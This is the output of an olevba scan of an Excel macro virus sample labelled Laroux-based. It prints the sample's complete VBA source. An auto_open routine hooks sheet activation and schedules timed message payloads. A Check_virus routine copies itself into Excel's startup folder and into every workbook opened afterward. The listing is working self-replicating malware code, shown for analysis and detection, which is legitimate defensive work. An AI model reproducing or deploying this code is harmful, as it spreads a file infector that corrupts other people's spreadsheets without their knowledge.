olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-f636626b5d7200c1520a6a86a88096a9d76aaf3c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO virus.bas 
in file: Virus.MSExcel.Laroux-based-f636626b5d7200c1520a6a86a88096a9d76aaf3c - OLE stream: '_VBA_PROJECT_CUR/VBA/virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





































Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "Check_virus"
    Application.OnTime TimeValue("10:00:00"), "MassageVirus"
    Application.OnTime TimeValue("12:00:00"), "MassageVirus"
    Application.OnTime TimeValue("15:00:00"), "MassageVirus"
    Application.OnTime TimeValue("20:00:00"), "MassageVirus"
End Sub

Sub Check_virus()
Attribute Check_virus.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "Virus.XLS")
    If m$ = "Virus.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
        Application.ScreenUpdating = True
        n4$ = ActiveWorkbook.Name
        Sheets("virus").Visible = True
        Sheets("virus").Select
        Sheets("virus").Copy
        With ActiveWorkbook
            .Title = ""
            .Subject = ""
            .Author = ""
            .Keywords = ""
            .Comments = ""
        End With
        newname$ = ActiveWorkbook.Name
        c4$ = CurDir()
        ChDir Application.StartupPath
        ActiveWindow.Visible = True
        Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "Virus.XLS", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        MsgBox "Virus kopiert"
        ChDir c4$
        Workbooks(n4$).Sheets("virus").Visible = True
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "Virus.xls!Check_virus"
    Case 1
        Application.ScreenUpdating = True
        n4$ = ActiveWorkbook.Name
        p4$ = ActiveWorkbook.Path
        s$ = Workbooks(n4$).Sheets(1).Name
        If s$ <> "virus" Then
            Workbooks("Virus.XLS").Sheets("virus").Copy before:=Workbooks(n4$).Sheets(1)
            Workbooks(n4$).Sheets("virus").Visible = True
        Else
        End If
        Application.OnSheetActivate = ""
        Application.ScreenUpdating = True
        Application.OnSheetActivate = "Virus.xls!Check_virus"
    Case Else
End Select
End Sub

Sub MassageVirus()
Attribute MassageVirus.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveCell.FormulaR1C1 = "¹ÙÀÌ·¯½º¿¡ °¨¿°µÇ¾úÀ½. ¸ÅÅ©·Î¹ÙÀÌ·¯½º¸¦ Àâ¾Æ¶ó"
    With ActiveCell.Characters(Start:=1, Length:=12).Font
        .Name = "µ¸¿ò"
        .FontStyle = "º¸Åë"
        .Size = 20
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = 3
    End With
    Range("A1").Select
    Selection.Copy
    Range("B2").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Selection.Copy
    Range("C3").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Selection.Copy
    Range("D4").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("E5").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("F6").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("G7").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
    Range("H8").Select
    ActiveSheet.Paste
    Application.CutCopyMode = False
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  viru
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

